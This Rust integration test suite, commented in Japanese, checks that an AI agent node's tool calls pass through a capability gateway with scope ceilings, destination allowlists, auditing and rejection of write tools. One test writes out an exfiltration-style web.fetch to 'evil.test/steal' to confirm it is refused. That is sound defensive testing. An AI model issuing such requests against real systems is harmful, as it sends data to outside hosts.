//! agent.invoke を agent-core のツールループで走らせる結合テスト（本番 executor＋ProdNodePorts・BUG-6）。
//!
//! stub の LLM は依頼が `calltool:<道具> <入力 JSON>` で始まり、その道具が提示されていれば 1 手目で
//! 1 回呼び、2 手目で「回答: <依頼>」を返す。道具の呼び出しはエンジンの能力ゲートウェイ（提示した道具か・
//! scope 天井・宛先の照合・監査）を通ってから StorageService（ReBAC）へ届く。
//!
//! 検証: 道具を 1 回呼んで答える（出力・出典・会計の利用元）／道具の省略は道具なし／web の天井の外の
//! 宛先は拒否／scope 天井の外の道具は提示しない／書込の道具は保存できない。
//! 実 PG＋OpenFGA＋RustFS が要る（`STORAGE_TEST_DATABASE_URL`・`OPENFGA_TEST_URL`・未設定はスキップ）。

#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    clippy::print_stderr,
    clippy::pedantic,
    clippy::too_many_lines
)]

use std::sync::{Arc, Mutex};
use std::time::Duration;

use authz::client::{OpenFgaClient, OpenFgaConfig};
use authz::{AuthContext, AuthzClient, Principal, PrincipalKind, Relation};
use serde_json::{json, Value};
use sqlx::postgres::PgPoolOptions;
use uuid::Uuid;
use workflow_engine::{
    AgentLimits, CapabilityNodeExecutor, Catalog, DelegationStore, EffectJournal, NodeContext,
    NodeExecutor, RunStatus, RunStore, WorkerConfig, WorkflowRunLauncher, WorkflowStore,
};

struct Harness {
    pool: sqlx::PgPool,
    storage: Arc<storage::StorageService>,
    gateway: Arc<llm_gateway::LlmGateway>,
    tenant: String,
    alice: AuthContext,
    workflows: WorkflowStore,
    runs: RunStore,
    launcher: WorkflowRunLauncher,
}

async fn setup() -> Option<Harness> {
    let (Ok(db), Ok(fga_url)) = (
        std::env::var("STORAGE_TEST_DATABASE_URL"),
        std::env::var("OPENFGA_TEST_URL"),
    ) else {
        eprintln!("STORAGE_TEST_DATABASE_URL / OPENFGA_TEST_URL 未設定のためスキップ");
        return None;
    };
    let s3_endpoint = std::env::var("STORAGE_TEST_S3_ENDPOINT")
        .unwrap_or_else(|_| "http://localhost:9000".into());
    let pool = PgPoolOptions::new()
        .max_connections(6)
        .connect(&db)
        .await
        .expect("pg");
    sqlx::migrate!("../../migrations")
        .run(&pool)
        .await
        .expect("migrate");
    let http = reqwest::Client::new();
    let fga = Arc::new(
        OpenFgaClient::connect(
            http.clone(),
            &OpenFgaConfig {
                base_url: fga_url,
                store_name: format!("shiki-wf-agent-{}", Uuid::new_v4()),
            },
            &authz::model::default_model(),
        )
        .await
        .expect("fga"),
    ) as Arc<dyn AuthzClient>;
    let s3 = storage::S3Config {
        internal_endpoint: s3_endpoint.clone(),
        public_endpoint: s3_endpoint,
        bucket: "shiki-it-blobs".into(),
        access_key: std::env::var("STORAGE_TEST_S3_ACCESS_KEY")
            .unwrap_or_else(|_| "minioadmin".into()),
        secret_key: std::env::var("STORAGE_TEST_S3_SECRET_KEY")
            .unwrap_or_else(|_| "minioadmin".into()),
        region: "us-east-1".into(),
        presign_get_ttl_secs: 300,
        presign_put_ttl_secs: 900,
        cors_allowed_origins: vec![],
    };
    let object_store: Arc<dyn storage::ObjectStore> = Arc::new(storage::S3ObjectStore::new(&s3));
    object_store.ensure_bucket().await.expect("bucket");
    let storage = Arc::new(storage::StorageService::new(
        pool.clone(),
        object_store,
        Arc::clone(&fga),
        Duration::from_secs(300),
        Duration::from_secs(900),
        5 * 1024 * 1024 * 1024,
    ));
    let gateway = Arc::new(
        llm_gateway::LlmGateway::build(
            pool.clone(),
            http,
            llm_gateway::GatewayConfig {
                provider: llm_gateway::ProviderConfig {
                    kind: llm_gateway::ProviderKind::Stub,
                    ..Default::default()
                },
                catalog: llm_gateway::ModelCatalog {
                    default_model: "stub".into(),
                    models: vec![llm_gateway::ModelEntry {
                        id: "stub".into(),
                        ..Default::default()
                    }],
                },
                langfuse: None,
                ..Default::default()
            },
        )
        .expect("gateway"),
    );
    let tenant = format!("t-{}", Uuid::new_v4().simple());
    let alice = AuthContext::new(
        Principal {
            kind: PrincipalKind::User,
            id: "alice".into(),
            email: None,
            groups: vec![],
            roles: vec![],
            tenant_id: Some(tenant.clone()),
        },
        tenant.clone(),
        tenant.clone(),
    );
    fga.write_tuple(
        &alice.subject(),
        Relation::Member,
        &alice.ns().organization(&tenant),
    )
    .await
    .expect("member tuple");
    let artifacts = Arc::new(artifact::ArtifactStore::new(pool.clone(), Arc::clone(&fga)));
    let workflows = WorkflowStore::new(Arc::clone(&artifacts));
    let runs = RunStore::new(pool.clone(), workflow_engine::DEFAULT_LEASE_SECS);
    let delegation = DelegationStore::new(pool.clone(), Arc::clone(&fga));
    let launcher = WorkflowRunLauncher::new(delegation, workflows.clone(), runs.clone());
    Some(Harness {
        pool,
        storage,
        gateway,
        tenant,
        alice,
        workflows,
        runs,
        launcher,
    })
}

/// 監査を捕捉する（宛先の拒否が残ることの検証用）。
#[derive(Default)]
struct CapturingAudit {
    records: Mutex<Vec<(String, bool, Value)>>,
}
impl workflow_engine::CapabilityAudit for CapturingAudit {
    fn record(&self, _t: &str, api: &str, ok: bool, meta: &Value) {
        self.records
            .lock()
            .unwrap()
            .push((api.to_string(), ok, meta.clone()));
    }
}

impl Harness {
    fn executor(&self, limits: AgentLimits, audit: Arc<CapturingAudit>) -> Arc<dyn NodeExecutor> {
        let ports = Arc::new(api::workflow_runtime::ProdNodePorts {
            storage: Arc::clone(&self.storage),
            search: None,
            gateway: Arc::clone(&self.gateway),
            sandbox: None,
            sandbox_backend: sandbox_client::SandboxBackend::Wasm,
            secrets: None,
            tabular: None,
            skill_artifacts: None,
            launcher: self.launcher.clone(),
            http: reqwest::Client::new(),
            db: self.pool.clone(),
            data: None,
            fsms: None,
            web_search: None,
        });
        Arc::new(
            CapabilityNodeExecutor::new(ports, EffectJournal::new(self.pool.clone()), audit)
                .with_agent_limits(limits),
        )
    }

    /// 1 ノードの IR を保存・対話起動し、完走させて（状態, agent の step の出力）を返す。
    async fn run_agent(
        &self,
        params: Value,
        scopes: &[&str],
        exec: Arc<dyn NodeExecutor>,
    ) -> (RunStatus, Value) {
        let ir = json!({
            "ir_version": 1, "name": format!("agent-{}", Uuid::new_v4().simple()),
            "declared_scopes": scopes,
            "triggers": [{ "kind": "interactive" }],
            "nodes": [{ "id": "ag", "type": "agent.invoke", "params": params }],
            "edges": []
        });
        let (wf_id, _) = self
            .workflows
            .create(&self.alice, &ir, &Catalog::default(), None)
            .await
            .expect("save");
        let run_id = self
            .launcher
            .start_interactive(&self.alice, wf_id, &json!({}))
            .await
            .expect("start")
            .expect("run id");
        let worker =
            workflow_engine::WorkflowWorker::new(self.runs.clone(), exec, WorkerConfig::default())
                .scoped_to_tenant(&self.tenant);
        while worker.claim_and_run_once("w1").await.unwrap() {}
        let status = self
            .runs
            .run_status(&self.tenant, run_id)
            .await
            .unwrap()
            .unwrap();
        let (output, error): (Option<Value>, Option<Value>) = sqlx::query_as(
            "SELECT output, error FROM step_execution WHERE tenant_id = $1 AND run_id = $2 AND step_path = 'ag'",
        )
        .bind(&self.tenant)
        .bind(run_id)
        .fetch_one(&self.pool)
        .await
        .unwrap();
        (status, output.or(error).unwrap_or(Value::Null))
    }

    async fn write_text(&self, name: &str, text: &str) -> Uuid {
        self.storage
            .write_file_internal(&self.alice, None, name, text.as_bytes(), "text/plain", None)
            .await
            .expect("write")
            .id
    }
}

/// stub の LLM が storage.read を 1 回呼んで答える。出力に回答・道具の使用・出典・消費が残り、会計の利用元は workflow。
#[tokio::test]
async fn agent_reads_a_file_with_a_tool_and_answers() {
    let Some(h) = setup().await else { return };
    let file = h
        .write_text("旅費規程.txt", "第 1 条 出張の日当は 2,000 円とする。")
        .await;
    let exec = h.executor(AgentLimits::default(), Arc::new(CapturingAudit::default()));
    let instruction = format!("calltool:storage.read {{\"file_id\":\"{file}\"}}");
    let (status, out) = h
        .run_agent(
            json!({ "instruction": instruction, "allowed_tools": ["storage.read"] }),
            &["storage.read"],
            exec,
        )
        .await;
    assert_eq!(status, RunStatus::Succeeded, "{out}");
    assert_eq!(out["text"], format!("回答: {instruction}"), "{out}");
    assert_eq!(out["complete"], true);
    assert_eq!(out["stop"], "completed");
    assert_eq!(out["model"], "stub", "モデルの省略は組織の既定");
    assert_eq!(
        out["tool_calls"],
        json!([{ "tool": "storage.read", "ok": true }])
    );
    assert_eq!(out["citations"][0]["file_id"], file.to_string());
    assert_eq!(out["citations"][0]["file_name"], "旅費規程.txt");
    assert!(out["citations"][0]["snippet"]
        .as_str()
        .unwrap()
        .contains("日当"));
    assert_eq!(out["usage"]["steps"], 2);
    assert_eq!(out["skipped_tools"], json!([]));
    let sources: Vec<String> =
        sqlx::query_scalar("SELECT source FROM llm_usage WHERE tenant_id = $1")
            .bind(&h.tenant)
            .fetch_all(&h.pool)
            .await
            .unwrap();
    assert_eq!(
        sources,
        vec!["workflow".to_string(); 2],
        "会計の利用元は workflow"
    );
}

/// 道具を省略した定義（旧 IR の形を含む）は道具なしで答える（依頼を Python として実行しない）。
#[tokio::test]
async fn agent_without_tools_answers_from_the_instruction() {
    let Some(h) = setup().await else { return };
    let file = h.write_text("メモ.txt", "非公開のメモ").await;
    let exec = h.executor(AgentLimits::default(), Arc::new(CapturingAudit::default()));
    let instruction = format!("calltool:storage.read {{\"file_id\":\"{file}\"}}");
    let (status, out) = h
        .run_agent(
            json!({ "instruction": instruction, "egress_allowlist": [], "max_duration_sec": 300 }),
            &["storage.read"],
            exec,
        )
        .await;
    assert_eq!(status, RunStatus::Succeeded, "{out}");
    assert_eq!(out["tool_calls"], json!([]), "道具は提示されない");
    assert_eq!(out["citations"], json!([]));
    assert_eq!(out["usage"]["steps"], 1);
    assert!(!out["text"].as_str().unwrap().contains("非公開のメモ"));
}

/// web.fetch は管理者の天井（∩ ノードの指定）の外の宛先を読めない（外へは出ない・監査に残る）。
#[tokio::test]
async fn agent_web_fetch_outside_the_ceiling_is_refused() {
    let Some(h) = setup().await else { return };
    let audit = Arc::new(CapturingAudit::default());
    let exec = h.executor(
        AgentLimits {
            web_ceiling: vec!["*.example.com".into()],
            ..AgentLimits::default()
        },
        Arc::clone(&audit),
    );
    let (status, out) = h
        .run_agent(
            json!({ "instruction": "calltool:web.fetch {\"url\":\"https://evil.test/steal?q=1\"}",
                    "allowed_tools": ["web.fetch"], "egress_allowlist": ["docs.example.com"] }),
            &["http.egress"],
            exec,
        )
        .await;
    assert_eq!(status, RunStatus::Succeeded, "{out}");
    assert_eq!(
        out["tool_calls"],
        json!([{ "tool": "web.fetch", "ok": false }])
    );
    assert_eq!(out["citations"], json!([]));
    let records = audit.records.lock().unwrap();
    assert!(
        records.iter().any(|(api, ok, meta)| api == "web.fetch"
            && !*ok
            && meta["reason"] == "host_not_allowed"
            && meta["detail"] == "evil.test"),
        "{records:?}"
    );
}

/// scope 天井の外の道具は提示しない（宣言を外した IR を直に走らせても読めない・skipped_tools に出る）。
#[tokio::test]
async fn agent_does_not_offer_tools_outside_the_scope_ceiling() {
    let Some(h) = setup().await else { return };
    let file = h.write_text("社外秘.txt", "社外秘の内容").await;
    let exec = h.executor(AgentLimits::default(), Arc::new(CapturingAudit::default()));
    let instruction = format!("calltool:storage.read {{\"file_id\":\"{file}\"}}");
    let ctx = NodeContext {
        tenant_id: h.tenant.clone(),
        org: h.tenant.clone(),
        run_id: Uuid::new_v4(),
        step_path: "ag".into(),
        idempotency_key: format!("wf:{}:ag", h.tenant),
        attempt: 1,
        principal: "alice".into(),
        principal_kind: "user".into(),
        input: json!({}),
        trigger: json!({}),
        node_outputs: Value::Null,
        each: None,
        trace_id: None,
        scope_ceiling: vec![],
        cancel: workflow_engine::CancelSignal::default(),
    };
    let res = exec
        .execute(
            "agent.invoke",
            &json!({ "instruction": instruction, "allowed_tools": ["storage.read", "web.search"] }),
            &ctx,
        )
        .await;
    assert!(res.ok, "{:?}", res.error);
    assert_eq!(res.output["tool_calls"], json!([]));
    assert_eq!(
        res.output["skipped_tools"],
        json!(["storage.read", "web.search"])
    );
    assert!(!res.output["text"]
        .as_str()
        .unwrap()
        .contains("社外秘の内容"));
}

/// 書込の道具は語彙に無い（v1 は読み取りだけ・書込は後段の能力ノード・D-29）。保存の時点で拒否される。
#[tokio::test]
async fn write_tools_cannot_be_saved() {
    let Some(h) = setup().await else { return };
    for tool in [
        "storage.write",
        "data.record.create",
        "csv.write",
        "http.request",
    ] {
        let ir = json!({
            "ir_version": 1, "name": format!("agent-w-{}", Uuid::new_v4().simple()),
            "declared_scopes": ["storage.write", "data.write", "csv.write", "http.egress"],
            "nodes": [{ "id": "ag", "type": "agent.invoke",
                        "params": { "instruction": "書いて", "allowed_tools": [tool] } }],
            "edges": []
        });
        let err = h
            .workflows
            .create(&h.alice, &ir, &Catalog::default(), None)
            .await
            .expect_err(tool);
        let text = format!("{err:?}");
        assert!(text.contains("allowed_tools"), "{tool}: {text}");
    }
}
